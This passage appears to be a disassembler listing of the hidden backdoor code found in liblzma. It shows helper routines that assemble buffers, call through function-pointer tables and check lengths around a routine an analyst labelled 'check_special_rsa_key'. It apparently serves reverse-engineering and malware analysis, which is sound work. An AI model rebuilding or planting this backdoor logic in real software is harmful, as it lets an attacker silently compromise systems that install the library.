.text.lzma_block_decoder_inia:0000000000007402 loc_7402:                               ; CODE XREF: sub_7350+A1↑j
.text.lzma_block_decoder_inia:0000000000007402                 add     rbp, 4
.text.lzma_block_decoder_inia:0000000000007406                 bswap   ebx
.text.lzma_block_decoder_inia:0000000000007408                 mov     [r13+0], ebx
.text.lzma_block_decoder_inia:000000000000740C                 mov     eax, 1
.text.lzma_block_decoder_inia:0000000000007411                 mov     [r12], rbp
.text.lzma_block_decoder_inia:0000000000007415
.text.lzma_block_decoder_inia:0000000000007415 loc_7415:                               ; CODE XREF: sub_7350+2F↑j
.text.lzma_block_decoder_inia:0000000000007415                 add     rsp, 18h
.text.lzma_block_decoder_inia:0000000000007419                 pop     rbx
.text.lzma_block_decoder_inia:000000000000741A                 pop     rbp
.text.lzma_block_decoder_inia:000000000000741B                 pop     r12
.text.lzma_block_decoder_inia:000000000000741D                 pop     r13
.text.lzma_block_decoder_inia:000000000000741F                 pop     r14
.text.lzma_block_decoder_inia:0000000000007421                 pop     r15
.text.lzma_block_decoder_inia:0000000000007423                 retn
.text.lzma_block_decoder_inia:0000000000007423 sub_7350        endp
.text.lzma_block_decoder_inia:0000000000007423
.text.lzma_block_decoder_inia:0000000000007423 _text_lzma_block_decoder_inia ends
.text.lzma_block_decoder_inia:0000000000007423
.text.lzma_block_encoder_updatd:0000000000007430 ; ===========================================================================
.text.lzma_block_encoder_updatd:0000000000007430
.text.lzma_block_encoder_updatd:0000000000007430 ; Segment type: Pure code
.text.lzma_block_encoder_updatd:0000000000007430 ; Segment permissions: Read/Execute
.text.lzma_block_encoder_updatd:0000000000007430 _text_lzma_block_encoder_updatd segment para public 'CODE' use64
.text.lzma_block_encoder_updatd:0000000000007430                 assume cs:_text_lzma_block_encoder_updatd
.text.lzma_block_encoder_updatd:0000000000007430                 ;org 7430h
.text.lzma_block_encoder_updatd:0000000000007430                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_block_encoder_updatd:0000000000007430
.text.lzma_block_encoder_updatd:0000000000007430 ; =============== S U B R O U T I N E =======================================
.text.lzma_block_encoder_updatd:0000000000007430
.text.lzma_block_encoder_updatd:0000000000007430
.text.lzma_block_encoder_updatd:0000000000007430 ; __int64 sub_7430(__int64, unsigned int, __int64, ...)
.text.lzma_block_encoder_updatd:0000000000007430 sub_7430        proc near               ; CODE XREF: _Llzma12_mode_map_part_1+119↓p
.text.lzma_block_encoder_updatd:0000000000007430                                         ; _Llzma12_mode_map_part_1+310↓p
.text.lzma_block_encoder_updatd:0000000000007430
.text.lzma_block_encoder_updatd:0000000000007430 var_D1          = byte ptr -0D1h
.text.lzma_block_encoder_updatd:0000000000007430 var_D0          = __va_list_tag ptr -0D0h
.text.lzma_block_encoder_updatd:0000000000007430 var_B8          = byte ptr -0B8h
.text.lzma_block_encoder_updatd:0000000000007430 var_A0          = qword ptr -0A0h
.text.lzma_block_encoder_updatd:0000000000007430 var_98          = qword ptr -98h
.text.lzma_block_encoder_updatd:0000000000007430 var_90          = qword ptr -90h
.text.lzma_block_encoder_updatd:0000000000007430 var_88          = xmmword ptr -88h
.text.lzma_block_encoder_updatd:0000000000007430 var_78          = xmmword ptr -78h
.text.lzma_block_encoder_updatd:0000000000007430 var_68          = xmmword ptr -68h
.text.lzma_block_encoder_updatd:0000000000007430 var_58          = xmmword ptr -58h
.text.lzma_block_encoder_updatd:0000000000007430 var_48          = xmmword ptr -48h
.text.lzma_block_encoder_updatd:0000000000007430 var_38          = xmmword ptr -38h
.text.lzma_block_encoder_updatd:0000000000007430 var_28          = xmmword ptr -28h
.text.lzma_block_encoder_updatd:0000000000007430 var_18          = xmmword ptr -18h
.text.lzma_block_encoder_updatd:0000000000007430 arg_0           = byte ptr  8
.text.lzma_block_encoder_updatd:0000000000007430
.text.lzma_block_encoder_updatd:0000000000007430                 sub     rsp, 0D8h
.text.lzma_block_encoder_updatd:0000000000007437                 mov     r10, rdi
.text.lzma_block_encoder_updatd:000000000000743A                 mov     [rsp+0D8h+var_A0], rcx
.text.lzma_block_encoder_updatd:000000000000743F                 mov     [rsp+0D8h+var_98], r8
.text.lzma_block_encoder_updatd:0000000000007444                 mov     [rsp+0D8h+var_90], r9
.text.lzma_block_encoder_updatd:0000000000007449                 test    al, al
.text.lzma_block_encoder_updatd:000000000000744B                 jz      short loc_7484
.text.lzma_block_encoder_updatd:000000000000744D                 movaps  [rsp+0D8h+var_88], xmm0
.text.lzma_block_encoder_updatd:0000000000007452                 movaps  [rsp+0D8h+var_78], xmm1
.text.lzma_block_encoder_updatd:0000000000007457                 movaps  [rsp+0D8h+var_68], xmm2
.text.lzma_block_encoder_updatd:000000000000745C                 movaps  [rsp+0D8h+var_58], xmm3
.text.lzma_block_encoder_updatd:0000000000007464                 movaps  [rsp+0D8h+var_48], xmm4
.text.lzma_block_encoder_updatd:000000000000746C                 movaps  [rsp+0D8h+var_38], xmm5
.text.lzma_block_encoder_updatd:0000000000007474                 movaps  [rsp+0D8h+var_28], xmm6
.text.lzma_block_encoder_updatd:000000000000747C                 movaps  [rsp+0D8h+var_18], xmm7
.text.lzma_block_encoder_updatd:0000000000007484
.text.lzma_block_encoder_updatd:0000000000007484 loc_7484:                               ; CODE XREF: sub_7430+1B↑j
.text.lzma_block_encoder_updatd:0000000000007484                 lea     rdi, [rsp+0D8h+var_D1]
.text.lzma_block_encoder_updatd:0000000000007489                 mov     [rsp+0D8h+var_D1], 0
.text.lzma_block_encoder_updatd:000000000000748E                 mov     r8d, esi
.text.lzma_block_encoder_updatd:0000000000007491                 xor     r9d, r9d
.text.lzma_block_encoder_updatd:0000000000007494                 lea     rax, [rsp+0D8h+arg_0]
.text.lzma_block_encoder_updatd:000000000000749C                 mov     [rsp+0D8h+var_D0.gp_offset], 18h
.text.lzma_block_encoder_updatd:00000000000074A4                 xor     ecx, ecx
.text.lzma_block_encoder_updatd:00000000000074A6                 mov     rsi, rdi
.text.lzma_block_encoder_updatd:00000000000074A9                 mov     [rsp+0D8h+var_D0.overflow_arg_area], rax
.text.lzma_block_encoder_updatd:00000000000074AE                 lea     rax, [rsp+0D8h+var_B8]
.text.lzma_block_encoder_updatd:00000000000074B3                 mov     [rsp+0D8h+var_D0.reg_save_area], rax
.text.lzma_block_encoder_updatd:00000000000074B8                 lea     rax, [rsp+0D8h+var_D0]
.text.lzma_block_encoder_updatd:00000000000074BD                 mov     [rsp+0D8h+var_D0.fp_offset], 30h ; '0'
.text.lzma_block_encoder_updatd:00000000000074C5                 push    rax
.text.lzma_block_encoder_updatd:00000000000074C6                 push    rdx
.text.lzma_block_encoder_updatd:00000000000074C7                 xor     edx, edx
.text.lzma_block_encoder_updatd:00000000000074C9                 call    qword ptr [r10+58h]
.text.lzma_block_encoder_updatd:00000000000074CD                 add     rsp, 0E8h
.text.lzma_block_encoder_updatd:00000000000074D4                 retn
.text.lzma_block_encoder_updatd:00000000000074D4 sub_7430        endp
.text.lzma_block_encoder_updatd:00000000000074D4
.text.lzma_block_encoder_updatd:00000000000074D4 _text_lzma_block_encoder_updatd ends
.text.lzma_block_encoder_updatd:00000000000074D4
.text.lzma_index_ena:00000000000074E0 ; ===========================================================================
.text.lzma_index_ena:00000000000074E0
.text.lzma_index_ena:00000000000074E0 ; Segment type: Pure code
.text.lzma_index_ena:00000000000074E0 ; Segment permissions: Read/Execute
.text.lzma_index_ena:00000000000074E0 _text_lzma_index_ena segment para public 'CODE' use64
.text.lzma_index_ena:00000000000074E0                 assume cs:_text_lzma_index_ena
.text.lzma_index_ena:00000000000074E0                 ;org 74E0h
.text.lzma_index_ena:00000000000074E0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_ena:00000000000074E0
.text.lzma_index_ena:00000000000074E0 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_ena:00000000000074E0
.text.lzma_index_ena:00000000000074E0
.text.lzma_index_ena:00000000000074E0 ; __int64 __fastcall sub_74E0(__int64, unsigned __int64 *, __int64)
.text.lzma_index_ena:00000000000074E0 sub_74E0        proc near               ; CODE XREF: check_special_rsa_key+3FA↓p
.text.lzma_index_ena:00000000000074E0                                         ; check_special_rsa_key+418↓p
.text.lzma_index_ena:00000000000074E0                 test    rdi, rdi
.text.lzma_index_ena:00000000000074E3                 jz      short loc_7536
.text.lzma_index_ena:00000000000074E5                 test    rdx, rdx
.text.lzma_index_ena:00000000000074E8                 jz      short loc_7536
.text.lzma_index_ena:00000000000074EA                 mov     rax, [rdx+8]
.text.lzma_index_ena:00000000000074EE                 test    rax, rax
.text.lzma_index_ena:00000000000074F1                 jz      short loc_7536
.text.lzma_index_ena:00000000000074F3                 push    rbp
.text.lzma_index_ena:00000000000074F4                 mov     rbp, rsi
.text.lzma_index_ena:00000000000074F7                 push    rbx
.text.lzma_index_ena:00000000000074F8                 mov     rbx, rdi
.text.lzma_index_ena:00000000000074FB                 push    rcx
.text.lzma_index_ena:00000000000074FC                 call    rax
.text.lzma_index_ena:00000000000074FE                 lea     rdx, [rax-8]
.text.lzma_index_ena:0000000000007502                 cmp     rdx, 7Fh
.text.lzma_index_ena:0000000000007506                 jbe     short loc_750C
.text.lzma_index_ena:0000000000007508                 xor     eax, eax
.text.lzma_index_ena:000000000000750A                 jmp     short loc_7532
.text.lzma_index_ena:000000000000750C ; ---------------------------------------------------------------------------
.text.lzma_index_ena:000000000000750C
.text.lzma_index_ena:000000000000750C loc_750C:                               ; CODE XREF: sub_74E0+26↑j
.text.lzma_index_ena:000000000000750C                 shr     rax, 3
.text.lzma_index_ena:0000000000007510                 xor     ecx, ecx
.text.lzma_index_ena:0000000000007512                 xor     edx, edx
.text.lzma_index_ena:0000000000007514
.text.lzma_index_ena:0000000000007514 loc_7514:                               ; CODE XREF: sub_74E0+44↓j
.text.lzma_index_ena:0000000000007514                 cmp     qword ptr [rbx+rdx*8], 0
.text.lzma_index_ena:0000000000007519                 jz      short loc_7529
.text.lzma_index_ena:000000000000751B                 lea     edx, [rcx+1]
.text.lzma_index_ena:000000000000751E                 mov     rcx, rdx
.text.lzma_index_ena:0000000000007521                 cmp     rdx, rax
.text.lzma_index_ena:0000000000007524                 jb      short loc_7514
.text.lzma_index_ena:0000000000007526                 mov     rdx, rax
.text.lzma_index_ena:0000000000007529
.text.lzma_index_ena:0000000000007529 loc_7529:                               ; CODE XREF: sub_74E0+39↑j
.text.lzma_index_ena:0000000000007529                 mov     [rbp+0], rdx
.text.lzma_index_ena:000000000000752D                 mov     eax, 1
.text.lzma_index_ena:0000000000007532
.text.lzma_index_ena:0000000000007532 loc_7532:                               ; CODE XREF: sub_74E0+2A↑j
.text.lzma_index_ena:0000000000007532                 pop     rdx
.text.lzma_index_ena:0000000000007533                 pop     rbx
.text.lzma_index_ena:0000000000007534                 pop     rbp
.text.lzma_index_ena:0000000000007535                 retn
.text.lzma_index_ena:0000000000007536 ; ---------------------------------------------------------------------------
.text.lzma_index_ena:0000000000007536
.text.lzma_index_ena:0000000000007536 loc_7536:                               ; CODE XREF: sub_74E0+3↑j
.text.lzma_index_ena:0000000000007536                                         ; sub_74E0+8↑j ...
.text.lzma_index_ena:0000000000007536                 xor     eax, eax
.text.lzma_index_ena:0000000000007538                 retn
.text.lzma_index_ena:0000000000007538 sub_74E0        endp
.text.lzma_index_ena:0000000000007538
.text.lzma_index_ena:0000000000007538 _text_lzma_index_ena ends
.text.lzma_index_ena:0000000000007538
.text.lzma_filters_copa:0000000000007540 ; ===========================================================================
.text.lzma_filters_copa:0000000000007540
.text.lzma_filters_copa:0000000000007540 ; Segment type: Pure code
.text.lzma_filters_copa:0000000000007540 ; Segment permissions: Read/Execute
.text.lzma_filters_copa:0000000000007540 _text_lzma_filters_copa segment para public 'CODE' use64
.text.lzma_filters_copa:0000000000007540                 assume cs:_text_lzma_filters_copa
.text.lzma_filters_copa:0000000000007540                 ;org 7540h
.text.lzma_filters_copa:0000000000007540                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_filters_copa:0000000000007540
.text.lzma_filters_copa:0000000000007540 ; =============== S U B R O U T I N E =======================================
.text.lzma_filters_copa:0000000000007540
.text.lzma_filters_copa:0000000000007540
.text.lzma_filters_copa:0000000000007540 ; __int64 __fastcall sub_7540(__int64, __int64, __int64, __int64)
.text.lzma_filters_copa:0000000000007540 sub_7540        proc near               ; CODE XREF: sub_7660+C3↓p
.text.lzma_filters_copa:0000000000007540
.text.lzma_filters_copa:0000000000007540 var_1060        = qword ptr -1060h
.text.lzma_filters_copa:0000000000007540 var_1058        = qword ptr -1058h
.text.lzma_filters_copa:0000000000007540 var_1050        = qword ptr -1050h
.text.lzma_filters_copa:0000000000007540 var_1042        = xmmword ptr -1042h
.text.lzma_filters_copa:0000000000007540 var_1032        = byte ptr -1032h
.text.lzma_filters_copa:0000000000007540 var_1030        = qword ptr -1030h
.text.lzma_filters_copa:0000000000007540
.text.lzma_filters_copa:0000000000007540                 push    r15
.text.lzma_filters_copa:0000000000007542                 push    r14
.text.lzma_filters_copa:0000000000007544                 push    r13
.text.lzma_filters_copa:0000000000007546                 push    r12
.text.lzma_filters_copa:0000000000007548                 push    rbp
.text.lzma_filters_copa:0000000000007549                 push    rbx
.text.lzma_filters_copa:000000000000754A                 sub     rsp, 1000h
.text.lzma_filters_copa:0000000000007551                 or      [rsp+1030h+var_1030], 0
.text.lzma_filters_copa:0000000000007556                 sub     rsp, 38h
.text.lzma_filters_copa:000000000000755A                 xor     eax, eax
.text.lzma_filters_copa:000000000000755C                 xorps   xmm0, xmm0
.text.lzma_filters_copa:000000000000755F                 mov     r8, rdi
.text.lzma_filters_copa:0000000000007562                 mov     rbp, rcx
.text.lzma_filters_copa:0000000000007565                 lea     rdi, [rsp+1068h+var_1032]
.text.lzma_filters_copa:000000000000756A                 mov     ecx, 0FFAh
.text.lzma_filters_copa:000000000000756F                 rep stosb
.text.lzma_filters_copa:0000000000007571                 xor     ecx, ecx
.text.lzma_filters_copa:0000000000007573                 movups  [rsp+1068h+var_1042], xmm0
.text.lzma_filters_copa:0000000000007578                 mov     [rsp+1068h+var_1060], rcx
.text.lzma_filters_copa:000000000000757D                 test    rbp, rbp
.text.lzma_filters_copa:0000000000007580                 jz      short loc_7587
.text.lzma_filters_copa:0000000000007582                 test    r8, r8
.text.lzma_filters_copa:0000000000007585                 jnz     short loc_758E
.text.lzma_filters_copa:0000000000007587
.text.lzma_filters_copa:0000000000007587 loc_7587:                               ; CODE XREF: sub_7540+40↑j
.text.lzma_filters_copa:0000000000007587                                         ; sub_7540+55↓j ...
.text.lzma_filters_copa:0000000000007587                 xor     eax, eax
.text.lzma_filters_copa:0000000000007589                 jmp     loc_7645
.text.lzma_filters_copa:000000000000758E ; ---------------------------------------------------------------------------
.text.lzma_filters_copa:000000000000758E
.text.lzma_filters_copa:000000000000758E loc_758E:                               ; CODE XREF: sub_7540+45↑j
.text.lzma_filters_copa:000000000000758E                 mov     rax, [rbp+60h]
.text.lzma_filters_copa:0000000000007592                 test    rax, rax
.text.lzma_filters_copa:0000000000007595                 jz      short loc_7587
.text.lzma_filters_copa:0000000000007597                 mov     r13, rdx
.text.lzma_filters_copa:000000000000759A                 xor     edx, edx
.text.lzma_filters_copa:000000000000759C                 xor     ecx, ecx
.text.lzma_filters_copa:000000000000759E                 mov     r12, rsi
.text.lzma_filters_copa:00000000000075A1                 mov     [rsp+1068h+var_1058], rdx
.text.lzma_filters_copa:00000000000075A6                 lea     rsi, [rsp+1068h+var_1050]
.text.lzma_filters_copa:00000000000075AB                 mov     rdi, r8
.text.lzma_filters_copa:00000000000075AE                 mov     [rsp+1068h+var_1050], rdx
.text.lzma_filters_copa:00000000000075B3                 lea     rdx, [rsp+1068h+var_1058]
.text.lzma_filters_copa:00000000000075B8                 call    rax
.text.lzma_filters_copa:00000000000075BA                 mov     rcx, [rsp+1068h+var_1058]
.text.lzma_filters_copa:00000000000075BF                 test    rcx, rcx
.text.lzma_filters_copa:00000000000075C2                 jz      short loc_7587
.text.lzma_filters_copa:00000000000075C4                 cmp     [rsp+1068h+var_1050], 0
.text.lzma_filters_copa:00000000000075CA                 jz      short loc_7587
.text.lzma_filters_copa:00000000000075CC                 lea     r15, [rsp+1068h+var_1060]
.text.lzma_filters_copa:00000000000075D1                 lea     r14, [rsp+1068h+var_1042]
.text.lzma_filters_copa:00000000000075D6                 mov     r8, rbp
.text.lzma_filters_copa:00000000000075D9                 mov     esi, 100Ah
.text.lzma_filters_copa:00000000000075DE                 mov     rdx, r15
.text.lzma_filters_copa:00000000000075E1                 mov     rdi, r14
.text.lzma_filters_copa:00000000000075E4                 call    sub_7350
.text.lzma_filters_copa:00000000000075E9                 test    eax, eax
.text.lzma_filters_copa:00000000000075EB                 jz      short loc_7587
.text.lzma_filters_copa:00000000000075ED                 mov     rbx, [rsp+1068h+var_1060]
.text.lzma_filters_copa:00000000000075F2                 cmp     rbx, 1009h
.text.lzma_filters_copa:00000000000075F9                 ja      short loc_7587
.text.lzma_filters_copa:00000000000075FB                 mov     esi, 100Ah
.text.lzma_filters_copa:0000000000007600                 mov     rcx, [rsp+1068h+var_1050]
.text.lzma_filters_copa:0000000000007605                 mov     r8, rbp
.text.lzma_filters_copa:0000000000007608                 mov     rdx, r15
.text.lzma_filters_copa:000000000000760B                 sub     rsi, rbx
.text.lzma_filters_copa:000000000000760E                 lea     rdi, [r14+rbx]
.text.lzma_filters_copa:0000000000007612                 call    sub_7350
.text.lzma_filters_copa:0000000000007617                 test    eax, eax
.text.lzma_filters_copa:0000000000007619                 jz      loc_7587
.text.lzma_filters_copa:000000000000761F                 add     rbx, [rsp+1068h+var_1060]
.text.lzma_filters_copa:0000000000007624                 mov     rsi, rbx
.text.lzma_filters_copa:0000000000007627                 cmp     rbx, 100Ah
.text.lzma_filters_copa:000000000000762E                 ja      loc_7587
.text.lzma_filters_copa:0000000000007634                 mov     r8, rbp
.text.lzma_filters_copa:0000000000007637                 mov     rcx, r13
.text.lzma_filters_copa:000000000000763A                 mov     rdx, r12
.text.lzma_filters_copa:000000000000763D                 mov     rdi, r14
.text.lzma_filters_copa:0000000000007640                 call    sub_72E0
.text.lzma_filters_copa:0000000000007645
.text.lzma_filters_copa:0000000000007645 loc_7645:                               ; CODE XREF: sub_7540+49↑j
.text.lzma_filters_copa:0000000000007645                 add     rsp, 1038h
.text.lzma_filters_copa:000000000000764C                 pop     rbx
.text.lzma_filters_copa:000000000000764D                 pop     rbp
.text.lzma_filters_copa:000000000000764E                 pop     r12
.text.lzma_filters_copa:0000000000007650                 pop     r13
.text.lzma_filters_copa:0000000000007652                 pop     r14
.text.lzma_filters_copa:0000000000007654                 pop     r15
.text.lzma_filters_copa:0000000000007656                 retn
.text.lzma_filters_copa:0000000000007656 sub_7540        endp
.text.lzma_filters_copa:0000000000007656
.text.lzma_filters_copa:0000000000007656 _text_lzma_filters_copa ends
.text.lzma_filters_copa:0000000000007656
.text.lzma_index_dua:0000000000007660 ; ===========================================================================
.text.lzma_index_dua:0000000000007660
.text.lzma_index_dua:0000000000007660 ; Segment type: Pure code
.text.lzma_index_dua:0000000000007660 ; Segment permissions: Read/Execute
.text.lzma_index_dua:0000000000007660 _text_lzma_index_dua segment para public 'CODE' use64
.text.lzma_index_dua:0000000000007660                 assume cs:_text_lzma_index_dua
.text.lzma_index_dua:0000000000007660                 ;org 7660h
.text.lzma_index_dua:0000000000007660                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_dua:0000000000007660
.text.lzma_index_dua:0000000000007660 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_dua:0000000000007660
.text.lzma_index_dua:0000000000007660
.text.lzma_index_dua:0000000000007660 ; __int64 __fastcall sub_7660(__int64, __int64, unsigned __int64, unsigned __int64, __int64, __int64, __int64)
.text.lzma_index_dua:0000000000007660 sub_7660        proc near               ; CODE XREF: _Lfile_info_decode_0+20E↓p
.text.lzma_index_dua:0000000000007660                                         ; _Lfile_info_decode_0+350↓p ...
.text.lzma_index_dua:0000000000007660
.text.lzma_index_dua:0000000000007660 var_F8          = qword ptr -0F8h
.text.lzma_index_dua:0000000000007660 var_F0          = qword ptr -0F0h
.text.lzma_index_dua:0000000000007660 var_E8          = qword ptr -0E8h
.text.lzma_index_dua:0000000000007660 var_E0          = qword ptr -0E0h
.text.lzma_index_dua:0000000000007660 var_D8          = qword ptr -0D8h
.text.lzma_index_dua:0000000000007660 var_D0          = qword ptr -0D0h
.text.lzma_index_dua:0000000000007660 var_C1          = xmmword ptr -0C1h
.text.lzma_index_dua:0000000000007660 var_B1          = byte ptr -0B1h
.text.lzma_index_dua:0000000000007660 arg_0           = qword ptr  8
.text.lzma_index_dua:0000000000007660
.text.lzma_index_dua:0000000000007660                 push    r15
.text.lzma_index_dua:0000000000007662                 push    r14
.text.lzma_index_dua:0000000000007664                 push    r13
.text.lzma_index_dua:0000000000007666                 push    r12
.text.lzma_index_dua:0000000000007668                 push    rbp
.text.lzma_index_dua:0000000000007669                 push    rbx
.text.lzma_index_dua:000000000000766A                 sub     rsp, 0C8h
.text.lzma_index_dua:0000000000007671                 mov     [rsp+0F8h+var_E8], r8
.text.lzma_index_dua:0000000000007676                 mov     r13, [rsp+0F8h+arg_0]
.text.lzma_index_dua:000000000000767E                 mov     [rsp+0F8h+var_F0], r9
.text.lzma_index_dua:0000000000007683                 test    rdi, rdi
.text.lzma_index_dua:0000000000007686                 jz      loc_7933
.text.lzma_index_dua:000000000000768C                 mov     rbp, rsi
.text.lzma_index_dua:000000000000768F                 test    rsi, rsi
.text.lzma_index_dua:0000000000007692                 jz      loc_7933
.text.lzma_index_dua:0000000000007698                 mov     r14, rcx
.text.lzma_index_dua:000000000000769B                 test    rcx, rcx
.text.lzma_index_dua:000000000000769E                 jz      loc_7933
.text.lzma_index_dua:00000000000076A4                 mov     rbx, rdx
.text.lzma_index_dua:00000000000076A7                 cmp     rdx, 0FFFFFFFFFFFFFFDEh
.text.lzma_index_dua:00000000000076AB                 ja      loc_7933
.text.lzma_index_dua:00000000000076B1                 lea     r15, [rdx+20h]
.text.lzma_index_dua:00000000000076B5                 test    r13, r13
.text.lzma_index_dua:00000000000076B8                 jz      loc_7933
.text.lzma_index_dua:00000000000076BE                 cmp     rcx, r15
.text.lzma_index_dua:00000000000076C1                 setb    al
.text.lzma_index_dua:00000000000076C4                 jb      loc_7933
.text.lzma_index_dua:00000000000076CA                 mov     r12, [r13+8]
.text.lzma_index_dua:00000000000076CE                 test    r12, r12
.text.lzma_index_dua:00000000000076D1                 jz      loc_7933
.text.lzma_index_dua:00000000000076D7                 mov     edx, [rdi]
.text.lzma_index_dua:00000000000076D9                 cmp     edx, 2
.text.lzma_index_dua:00000000000076DC                 jz      short loc_7742
.text.lzma_index_dua:00000000000076DE                 jg      short loc_7704
.text.lzma_index_dua:00000000000076E0                 test    edx, edx
.text.lzma_index_dua:00000000000076E2                 jz      short loc_7712
.text.lzma_index_dua:00000000000076E4                 dec     edx
.text.lzma_index_dua:00000000000076E6                 jnz     loc_7933
.text.lzma_index_dua:00000000000076EC                 mov     rdx, rcx
.text.lzma_index_dua:00000000000076EF                 mov     rdi, [rdi+10h]
.text.lzma_index_dua:00000000000076F3                 lea     rsi, [rsi+rbx]
.text.lzma_index_dua:00000000000076F7                 mov     rcx, r13
.text.lzma_index_dua:00000000000076FA                 sub     rdx, rbx
.text.lzma_index_dua:00000000000076FD                 call    sub_3B70
.text.lzma_index_dua:0000000000007702                 jmp     short loc_7728
.text.lzma_index_dua:0000000000007704 ; ---------------------------------------------------------------------------
.text.lzma_index_dua:0000000000007704
.text.lzma_index_dua:0000000000007704 loc_7704:                               ; CODE XREF: sub_7660+7E↑j
.text.lzma_index_dua:0000000000007704                 cmp     edx, 3
.text.lzma_index_dua:0000000000007707                 jz      loc_7825
.text.lzma_index_dua:000000000000770D                 jmp     loc_7933
.text.lzma_index_dua:0000000000007712 ; ---------------------------------------------------------------------------
.text.lzma_index_dua:0000000000007712
.text.lzma_index_dua:0000000000007712 loc_7712:                               ; CODE XREF: sub_7660+82↑j
.text.lzma_index_dua:0000000000007712                 mov     rdx, rcx
.text.lzma_index_dua:0000000000007715                 mov     rdi, [rdi+8]
.text.lzma_index_dua:0000000000007719                 lea     rsi, [rsi+rbx]
.text.lzma_index_dua:000000000000771D                 mov     rcx, r12
.text.lzma_index_dua:0000000000007720                 sub     rdx, rbx
.text.lzma_index_dua:0000000000007723                 call    sub_7540
.text.lzma_index_dua:0000000000007728
.text.lzma_index_dua:0000000000007728 loc_7728:                               ; CODE XREF: sub_7660+A2↑j
.text.lzma_index_dua:0000000000007728                                         ; sub_7660+225↓j
.text.lzma_index_dua:0000000000007728                 test    eax, eax
.text.lzma_index_dua:000000000000772A                 jz      loc_7933
.text.lzma_index_dua:0000000000007730                 mov     rbx, [r13+8]
.text.lzma_index_dua:0000000000007734                 test    rbx, rbx
.text.lzma_index_dua:0000000000007737                 jnz     loc_788A
.text.lzma_index_dua:000000000000773D                 jmp     loc_7933
.text.lzma_index_dua:0000000000007742 ; ---------------------------------------------------------------------------
.text.lzma_index_dua:0000000000007742
.text.lzma_index_dua:0000000000007742 loc_7742:                               ; CODE XREF: sub_7660+7C↑j
.text.lzma_index_dua:0000000000007742                 mov     rdx, [rdi+20h]
.text.lzma_index_dua:0000000000007746                 xorps   xmm0, xmm0
.text.lzma_index_dua:0000000000007749                 lea     rdi, [rsp+0F8h+var_B1]
.text.lzma_index_dua:000000000000774E                 mov     ecx, 79h ; 'y'
.text.lzma_index_dua:0000000000007753                 movups  [rsp+0F8h+var_C1], xmm0
.text.lzma_index_dua:0000000000007758                 rep stosb
.text.lzma_index_dua:000000000000775A                 test    rdx, rdx
.text.lzma_index_dua:000000000000775D                 jz      loc_7933
.text.lzma_index_dua:0000000000007763                 mov     rax, [r12+48h]
.text.lzma_index_dua:0000000000007768                 test    rax, rax
.text.lzma_index_dua:000000000000776B                 jz      loc_7933
.text.lzma_index_dua:0000000000007771                 cmp     qword ptr [r12+50h], 0
.text.lzma_index_dua:0000000000007777                 jz      loc_7933
.text.lzma_index_dua:000000000000777D                 cmp     qword ptr [r12+40h], 0
.text.lzma_index_dua:0000000000007783                 jz      loc_7933
.text.lzma_index_dua:0000000000007789                 mov     rdi, rdx
.text.lzma_index_dua:000000000000778C                 mov     [rsp+0F8h+var_E0], rdx
.text.lzma_index_dua:0000000000007791                 call    rax
.text.lzma_index_dua:0000000000007793                 mov     rdi, [rsp+0F8h+var_E0]
.text.lzma_index_dua:0000000000007798                 mov     [rsp+0F8h+var_F8], rax
.text.lzma_index_dua:000000000000779C                 call    qword ptr [r12+50h]
.text.lzma_index_dua:00000000000077A1                 xor     r8d, r8d
.text.lzma_index_dua:00000000000077A4                 mov     rsi, [rsp+0F8h+var_F8]
.text.lzma_index_dua:00000000000077A8                 xor     r9d, r9d
.text.lzma_index_dua:00000000000077AB                 mov     [rsp+0F8h+var_D0], rax
.text.lzma_index_dua:00000000000077B0                 mov     rdi, rax
.text.lzma_index_dua:00000000000077B3                 xor     ecx, ecx
.text.lzma_index_dua:00000000000077B5                 mov     edx, 4
.text.lzma_index_dua:00000000000077BA                 call    qword ptr [r12+40h]
.text.lzma_index_dua:00000000000077BF                 mov     r8, rax
.text.lzma_index_dua:00000000000077C2                 cmp     rax, 85h
.text.lzma_index_dua:00000000000077C8                 ja      loc_7933
.text.lzma_index_dua:00000000000077CE                 bswap   eax
.text.lzma_index_dua:00000000000077D0                 mov     dword ptr [rsp+0F8h+var_C1], eax
.text.lzma_index_dua:00000000000077D4                 lea     rax, [rsp+0F8h+var_C1]
.text.lzma_index_dua:00000000000077D9                 mov     rsi, [rsp+0F8h+var_F8]
.text.lzma_index_dua:00000000000077DD                 mov     [rsp+0F8h+var_D8], r8
.text.lzma_index_dua:00000000000077E2                 mov     rdi, [rsp+0F8h+var_D0]
.text.lzma_index_dua:00000000000077E7                 lea     rcx, [rsp+0F8h+var_C1+4]
.text.lzma_index_dua:00000000000077EC                 xor     r9d, r9d
.text.lzma_index_dua:00000000000077EF                 mov     [rsp+0F8h+var_E0], rax
.text.lzma_index_dua:00000000000077F4                 mov     edx, 4
.text.lzma_index_dua:00000000000077F9                 call    qword ptr [r12+40h]
.text.lzma_index_dua:00000000000077FE                 mov     r8, [rsp+0F8h+var_D8]
.text.lzma_index_dua:0000000000007803                 cmp     r8, rax
.text.lzma_index_dua:0000000000007806                 jnz     loc_7933
.text.lzma_index_dua:000000000000780C                 mov     rcx, r14
.text.lzma_index_dua:000000000000780F                 lea     rsi, [r8+4]
.text.lzma_index_dua:0000000000007813                 mov     rdi, [rsp+0F8h+var_E0]
.text.lzma_index_dua:0000000000007818                 mov     r8, r12
.text.lzma_index_dua:000000000000781B                 sub     rcx, rbx
.text.lzma_index_dua:000000000000781E                 lea     rdx, [rbp+rbx+0]
.text.lzma_index_dua:0000000000007823                 jmp     short loc_7880
.text.lzma_index_dua:0000000000007825 ; ---------------------------------------------------------------------------
.text.lzma_index_dua:0000000000007825
.text.lzma_index_dua:0000000000007825 loc_7825:                               ; CODE XREF: sub_7660+A7↑j
.text.lzma_index_dua:0000000000007825                 mov     rdx, [rdi+30h]
.text.lzma_index_dua:0000000000007829                 xorps   xmm0, xmm0
.text.lzma_index_dua:000000000000782C                 lea     rdi, [rsp+0F8h+var_B1]
.text.lzma_index_dua:0000000000007831                 xor     eax, eax
.text.lzma_index_dua:0000000000007833                 mov     ecx, 5
.text.lzma_index_dua:0000000000007838                 movups  [rsp+0F8h+var_C1], xmm0
.text.lzma_index_dua:000000000000783D                 rep stosd
.text.lzma_index_dua:000000000000783F                 test    rdx, rdx
